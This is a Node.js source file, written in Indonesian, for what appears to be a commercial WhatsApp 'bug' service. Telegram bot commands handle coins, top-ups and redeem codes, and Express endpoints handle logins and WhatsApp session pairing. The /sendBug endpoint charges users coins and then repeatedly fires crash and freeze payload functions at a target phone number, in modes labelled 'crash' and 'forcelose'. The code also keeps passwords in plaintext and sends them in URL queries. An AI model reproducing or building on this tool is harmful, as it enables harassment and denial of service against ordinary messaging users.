  bot.sendMessage(chatId, `✅ Request top up berhasil dibatalkan.\n\n📋 Request ID: \`${requestId}\``, { parse_mode: "Markdown" });
}); // ✅ TUTUP HANDLER INI DENGAN BENAR

// ===== COMMAND: /pendingtopup - Lihat semua request pending =====
bot.onText(/^\/pendingtopup$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  const pending = topupRequests.filter(r => r.status === "pending");

  if (pending.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Tidak ada request top up yang pending.");
  }

  let message = "*📋 DAFTAR TOP UP REQUEST (PENDING)*\n\n";
  
  for (const req of pending) {
    const source = req.source === "app" ? "📱 Mobile App" : "💬 Telegram";
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📋 Request ID: \`${req.requestId}\`\n`;
    message += `👤 Username: ${req.username}\n`;
    message += `💰 Jumlah: ${req.amount} coins\n`;
    message += `📍 Source: ${source}\n`;
    message += `⏰ Waktu: ${new Date(req.timestamp).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━\n`;
  message += `_Total: ${pending.length} request pending_\n\n`;
  message += `Gunakan button approve/reject di notifikasi, atau:\n`;
  message += `/addcoin <requestId> - Approve\n`;
  message += `/rejecttopup <requestId> - Reject`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===== COMMAND: /historytopup - Lihat riwayat top up =====
bot.onText(/^\/historytopup(?:\s+(\S+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1] ? match[1].trim() : null;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  let filtered = topupRequests;

  if (username) {
    filtered = topupRequests.filter(r => r.username.toLowerCase() === username.toLowerCase());
    
    if (filtered.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ada riwayat top up untuk user *${username}*.`, { parse_mode: "Markdown" });
    }
  }

  filtered.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  const recent = filtered.slice(0, 20);

  let message = username 
    ? `*📜 RIWAYAT TOP UP: ${username}*\n\n`
    : `*📜 RIWAYAT TOP UP (20 TERAKHIR)*\n\n`;

  for (const req of recent) {
    const statusEmoji = req.status === "approved" ? "✅" : req.status === "rejected" ? "❌" : req.status === "cancelled" ? "🚫" : "⏳";
    const source = req.source === "app" ? "📱 App" : "💬 TG";
    
    message += `${statusEmoji} \`${req.requestId}\` | ${req.username}\n`;
    message += `💰 ${req.amount} coins | ${source} | ${req.status}\n`;
    message += `⏰ ${new Date(req.timestamp).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n`;
    
    if (req.processedBy) {
      message += `👮 By: ${req.processedBy}\n`;
    }
    
    message += `━━━━━━━━━━━━━━━━━━\n`;
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ===== COMMAND BOT: /redeem <kode> - Redeem code coin =====
bot.onText(/^\/redeem\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const code = match[1].toUpperCase();

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  const redeemCodes = loadRedeemCodes();
  const redeemData = redeemCodes.find(r => r.code === code);

  if (!redeemData) {
    return bot.sendMessage(chatId, "❌ Kode redeem tidak valid!");
  }

  if (redeemData.used) {
    return bot.sendMessage(chatId, `❌ Kode redeem sudah digunakan!

Digunakan oleh: ${redeemData.used_by}
Pada: ${new Date(redeemData.used_at).toLocaleString("id-ID")}`);
  }

  // Validasi role
  const roleHierarchy = {
    member: 1,
    reseller: 2,
    vip: 3,
    owner: 4
  };

  const userRole = user.role || "member";
  const codeRole = redeemData.role;

  if (roleHierarchy[userRole] < roleHierarchy[codeRole]) {
    return bot.sendMessage(chatId, `❌ Kode redeem ini hanya untuk role *${codeRole.toUpperCase()}* atau lebih tinggi!

Role kamu saat ini: *${userRole.toUpperCase()}*`, { parse_mode: "Markdown" });
  }

  // Redeem kode
  const db = loadDatabase();
  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += redeemData.amount;
  saveDatabase(db);

  // Update status redeem
  redeemData.used = true;
  redeemData.used_by = user.username;
  redeemData.used_at = new Date().toISOString();
  saveRedeemCodes(redeemCodes);

  bot.sendMessage(chatId, `✅ *Redeem Berhasil!*

🎁 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
💰 Kamu mendapat: +${redeemData.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}

Selamat menikmati!`, { parse_mode: "Markdown" });

  // Log ke group
  sendToGroupsUtama(`🎁 *Kode Redeem Digunakan*

🎟 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
👤 User: ${user.username}
💰 Nilai: ${redeemData.amount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | REDEEM | ${user.username} redeemed ${code} (${codeRole}) for ${redeemData.amount} coins | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /listtopup - Lihat semua request pending
bot.onText(/^\/listtopup$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const topupRequests = loadTopupRequests();
  const pending = topupRequests.filter(r => r.status === "pending");

  if (pending.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Tidak ada request top up yang pending.");
  }

  let message = "*📋 Daftar Top Up Request (Pending)*\n\n";
  
  for (const req of pending) {
    const source = req.source === "app" ? "📱 App" : "💬 Telegram";
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📋 ID: \`${req.requestId}\`\n`;
    message += `👤 User: ${req.username}\n`;
    message += `💰 Jumlah: ${req.amount} coins\n`;
    message += `📍 Source: ${source}\n`;
    message += `⏰ ${new Date(req.timestamp).toLocaleString("id-ID")}\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━\n`;
  message += `_Total: ${pending.length} request_\n\n`;
  message += `*Cara Approve/Reject:*\n`;
  message += `/addcoin <requestId> - Approve\n`;
  message += `/rejecttopup <requestId> - Reject`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});


// Command: /listredeems - Owner only, lihat semua kode redeem
bot.onText(/^\/listredeems$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const redeemCodes = loadRedeemCodes();
  
  if (redeemCodes.length === 0) {
    return bot.sendMessage(chatId, "ℹ️ Belum ada kode redeem yang dibuat.");
  }

  const unused = redeemCodes.filter(r => !r.used);
  const used = redeemCodes.filter(r => r.used);

  let message = `*📋 Daftar Redeem Codes*\n\n`;
  message += `✅ Tersedia: ${unused.length}\n`;
  message += `❌ Terpakai: ${used.length}\n`;
  message += `📊 Total: ${redeemCodes.length}\n\n`;

  if (unused.length > 0) {
    message += `*Kode Tersedia:*\n`;
    
    // Group by role
    const byRole = {};
    unused.forEach(r => {
      if (!byRole[r.role]) byRole[r.role] = [];
      byRole[r.role].push(r);
    });

    for (const [role, codes] of Object.entries(byRole)) {
      message += `\n🎯 *${role.toUpperCase()}* (${codes[0].amount} coins):\n`;
      codes.slice(0, 5).forEach((r, idx) => {
        message += `${idx + 1}. \`${r.code}\`\n`;
      });
      if (codes.length > 5) {
        message += `_...dan ${codes.length - 5} kode lainnya_\n`;
      }
    }
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});


// Command: /addcoin <requestId>
bot.onText(/^\/addcoin\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const requestId = match[1].toUpperCase();
  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan atau sudah diproses.");
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === request.username);

  if (!user) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan di database.");
  }

  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += request.amount;
  saveDatabase(db);

  // Update request status
  request.status = "approved";
  request.processedAt = new Date().toISOString();
  request.processedBy = msg.from.username || msg.from.first_name;
  saveTopupRequests(topupRequests);

  // Notify admin (owner ID)
  bot.sendMessage(chatId, `✅ *Top Up Berhasil Diproses*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Coin: ${oldCoins} → ${user.coins} (+${request.amount})
✓ Status: Approved`, { parse_mode: "Markdown" });

  // Notify user (jika ada telegram ID)
  if (request.userId) {
    try {
      bot.sendMessage(request.userId, `✅ *Top Up Berhasil!*

📋 Request ID: \`${requestId}\`
💰 Jumlah: +${request.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}

Terima kasih telah melakukan top up!`, { parse_mode: "Markdown" });
    } catch (err) {
      console.log("Gagal kirim notifikasi ke user:", err.message);
    }
  }

  // NOTIFIKASI KE GRUP (HANYA INFO BERHASIL, TANPA BUTTON)
  sendToGroupsUtama(`✅ *Top Up Berhasil*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Jumlah: ${request.amount} coins
💳 Saldo: ${oldCoins} → ${user.coins}
👮 Diproses oleh: ${request.processedBy}
⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} approved ${request.amount} coins for ${user.username} | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /rejecttopup <requestId> - Reject topup
bot.onText(/^\/rejecttopup\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const requestId = match[1].toUpperCase();
  const topupRequests = loadTopupRequests();
  const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

  if (!request) {
    return bot.sendMessage(chatId, "❌ Request ID tidak ditemukan atau sudah diproses.");
  }

  // Update request status
  request.status = "rejected";
  request.processedAt = new Date().toISOString();
  request.processedBy = msg.from.username || msg.from.first_name;
  saveTopupRequests(topupRequests);

  // Notify admin
  bot.sendMessage(chatId, `❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
👤 Username: ${request.username}
💰 Jumlah: ${request.amount} coins
✗ Status: Rejected`, { parse_mode: "Markdown" });

  // Notify user (jika ada telegram ID)
  if (request.userId) {
    try {
      bot.sendMessage(request.userId, `❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
💰 Jumlah: ${request.amount} coins

Request top up kamu telah ditolak. Silakan hubungi admin untuk informasi lebih lanjut.`, { parse_mode: "Markdown" });
    } catch (err) {
      console.log("Gagal kirim notifikasi ke user:", err.message);
    }
  }

  // Log to group
  sendToGroupsUtama(`❌ *Top Up Ditolak*

📋 Request ID: \`${requestId}\`
👤 Username: ${request.username}
💰 Jumlah: ${request.amount} coins
👮 Ditolak oleh: ${request.processedBy}`, { parse_mode: "Markdown" });

  // Log to file
  const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} rejected ${request.amount} coins for ${request.username}\n`;
  fs.appendFileSync('logTopup.txt', logLine);
});

// Command: /checkcoin (untuk user cek saldo sendiri)
bot.onText(/^\/checkcoin$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const user = findUserByTelegramId(userId);

  if (!user) {
    return bot.sendMessage(chatId, `❌ Akun kamu belum terdaftar di sistem!

Silakan daftar terlebih dahulu dengan:
/register <username> <password>

Contoh: /register john123 pass123`);
  }

  if (user.coins === undefined) {
    user.coins = 100;
    const db = loadDatabase();
    saveDatabase(db);
  }

  bot.sendMessage(chatId, `💰 *Saldo Coin Kamu*

👤 Username: ${user.username}
🎯 Role: ${user.role || "member"}
💳 Coin: ${user.coins}
⏳ Expired: ${user.expiredDate}

💡 Setiap bug membutuhkan 25 coins.
📝 Gunakan /topup <jumlah> untuk top up.
🎁 Gunakan /redeem <kode> untuk redeem coin.`, { parse_mode: "Markdown" });
});

// ===== SISTEM REDEEM CODE =====

// Command: /createredeem <jumlah_coin> <jumlah_kode> - Owner only
// Command: /createredeem <role> <jumlah_kode> - Owner only
bot.onText(/^\/createredeem\s+(member|reseller|vip|owner)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const role = match[1].toLowerCase();
  const quantity = parseInt(match[2]);

  // Tentukan jumlah coin berdasarkan role
  const coinAmounts = {
    member: 5,
    reseller: 200,
    vip: 300,
    owner: 500
  };

  const coinAmount = coinAmounts[role];

  if (quantity < 1 || quantity > 50) {
    return bot.sendMessage(chatId, "❌ Input tidak valid!\n\nJumlah kode: 1-50");
  }

  const redeemCodes = loadRedeemCodes();
  const newCodes = [];

  for (let i = 0; i < quantity; i++) {
    const code = crypto.randomBytes(6).toString("hex").toUpperCase();
    const redeemData = {
      code,
      role,
      amount: coinAmount,
      created_at: new Date().toISOString(),
      created_by: msg.from.username || msg.from.first_name,
      used: false,
      used_by: null,
      used_at: null
    };
    
    redeemCodes.push(redeemData);
    newCodes.push(code);
  }

  saveRedeemCodes(redeemCodes);

  // Buat file text berisi kode-kode
  const fileName = `redeem_${role}_${Date.now()}.txt`;
  const fileContent = `REDEEM CODES - ${new Date().toLocaleString("id-ID")}
Role: ${role.toUpperCase()}
Jumlah Coin per Kode: ${coinAmount}
Total Kode: ${quantity}
Dibuat oleh: ${msg.from.username || msg.from.first_name}

==========================================

${newCodes.map((code, idx) => `${idx + 1}. ${code}`).join('\n')}

==========================================

Cara pakai: /redeem <kode>`;

  fs.writeFileSync(fileName, fileContent);

  await bot.sendDocument(chatId, fileName, {
    caption: `✅ *Berhasil Membuat ${quantity} Kode Redeem!*

🎯 Role: ${role.toUpperCase()}
💰 Nilai: ${coinAmount} coins per kode
📝 Total: ${quantity} kode

Kode-kode telah disimpan dalam file.`, 
    parse_mode: "Markdown"
  });

  // Hapus file setelah dikirim
  fs.unlinkSync(fileName);

  // Log ke group
  sendToGroupsUtama(`🎁 *Redeem Code Dibuat*

🎯 Role: ${role.toUpperCase()}
💰 Nilai: ${coinAmount} coins
📝 Jumlah: ${quantity} kode
👮 Oleh: ${msg.from.username || msg.from.first_name}`, { parse_mode: "Markdown" });
});

// Command: /deleteredeem <kode> - Owner only, hapus kode redeem
bot.onText(/^\/deleteredeem\s+([A-F0-9]+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const code = match[1].toUpperCase();
  let redeemCodes = loadRedeemCodes();
  
  const index = redeemCodes.findIndex(r => r.code === code);
  
  if (index === -1) {
    return bot.sendMessage(chatId, "❌ Kode redeem tidak ditemukan!");
  }

  const deleted = redeemCodes[index];
  redeemCodes.splice(index, 1);
  saveRedeemCodes(redeemCodes);

  bot.sendMessage(chatId, `✅ *Kode Redeem Dihapus*

🎟 Kode: \`${code}\`
🎯 Role: ${deleted.role.toUpperCase()}
💰 Nilai: ${deleted.amount} coins
📊 Status: ${deleted.used ? 'Sudah dipakai' : 'Belum dipakai'}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/testcoin\s+(\S+)$/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  
  const username = match[1];
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user) {
    return bot.sendMessage(msg.chat.id, "❌ User tidak ditemukan");
  }
  
  bot.sendMessage(msg.chat.id, `📊 *Debug Info:*

👤 Username: ${user.username}
🎯 Role: ${user.role}
💰 Coins: ${user.coins ?? "undefined"}
⏳ Expired: ${user.expiredDate}
📝 Has coins field: ${user.hasOwnProperty('coins')}

${!user.coins ? '⚠️ COINS UNDEFINED!' : '✅ Coins OK'}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/setcoin\s+(\S+)\s+(\d+)$/i, async (msg, match) => {
  if (msg.from.id !== OWNER_ID) return;
  
  const username = match[1];
  const coins = parseInt(match[2]);
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  
  if (!user) {
    return bot.sendMessage(msg.chat.id, "❌ User tidak ditemukan");
  }
  
  user.coins = coins;
  saveDatabase(db);
  
  bot.sendMessage(msg.chat.id, `✅ *Coins Updated!*

👤 Username: ${username}
💰 New Coins: ${coins}

Sekarang:
1. Log in Yo Aplikasi 
2. Coins akan update`, { parse_mode: "Markdown" });
});

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/euyh1x.jpg",
    title: "NDX-07-5",
    desc: "Buy Acces Chat @Dheat_MD"
  },
  {
    image: "https://files.catbox.moe/euyh1x.jpg",
    title: "NDX-07-5 V1.0",
    desc: "channel : https://t.me/AboutDheat"
  }
];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  
  console.log("\n=== 🔍 DEBUG MYINFO ===");
  console.log("Username:", username);
  console.log("Key:", key);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  
  if (!user) {
    console.log("❌ User not found");
    return res.json({ valid: false });
  }

  // ✅ PENTING: Pastikan coins ada
  if (user.coins === undefined || user.coins === null) {
    console.log("⚠️ Coins undefined, setting to 100");
    user.coins = 100;
    saveDatabase(db);
  }

  console.log("✅ User Data:");
  console.log("  - Username:", user.username);
  console.log("  - Role:", user.role);
  console.log("  - Coins:", user.coins); // ⚠️ CEK INI
  console.log("  - Expired:", user.expiredDate);

  const response = {
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    coins: user.coins, // ✅ KIRIM COINS
    listBug: bugs,
    news: news
  };

  console.log("📤 Response Coins:", response.coins);
  console.log("======================\n");

  return res.json(response);
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// Utility functions
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== COIN CHECK =====
  if (user.coins === undefined) user.coins = 100;
  
  if (user.coins < 25) {
    console.log(`[❌ COIN] ${user.username} tidak punya cukup coin (${user.coins}/25)`);
    return res.json({
      valid: true,
      sended: false,
      insufficient_coins: true,
      current_coins: user.coins,
      required_coins: 25,
      message: "Coin tidak cukup! Minimal 25 coin untuk mengirim bug."
    });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 10,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ===== DEDUCT COINS - LANGSUNG POTONG DI SINI =====
  user.coins -= 25;
  user.lastSend = now;
  saveDatabase(db);
  console.log(`[💰 COIN] ${user.username} coins: ${user.coins + 25} → ${user.coins}`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    coins_remaining: user.coins
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "forcelose":
            for (let i = 0; i < 2; i++) {
              await iOSxTend(sock, targetJid);
              await iOSxTend(sock, targetJid);
              await YakuzaDrainPoint1(sock, targetJid);
              await superHatdNeested(sock, targetJid);
              await sleep(100);
            }
            break;
          case "crash":
            for (let i = 0; i < 35; i++) {
              await LocaFreezHome(sock, targetJid);
              await superHatdNeested(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "fcinvis":
            for (let i = 0; i < 10; i++) {
              await YakuzaDrainPoint1(sock, jid);
              await YakuzaDrainPoint1(sock, jid);
              await iOSxTend(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "delayy":
            for (let i = 0; i < 20; i++) {
              await YakuzaDrainPoint1(sock, jid);
              await sleep(1000);
            }
            break;
        }

console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        // ✅ TIDAK ADA REFUND - COIN TETAP TERPOTONG
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia.`);
      // ✅ TIDAK ADA REFUND - COIN TETAP TERPOTONG
      return;
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  } else {
    return res.json({ valid: false, message: "Already registered" });
  }
  } catch (err) {
    console.error("Error in getPairing:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});
// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
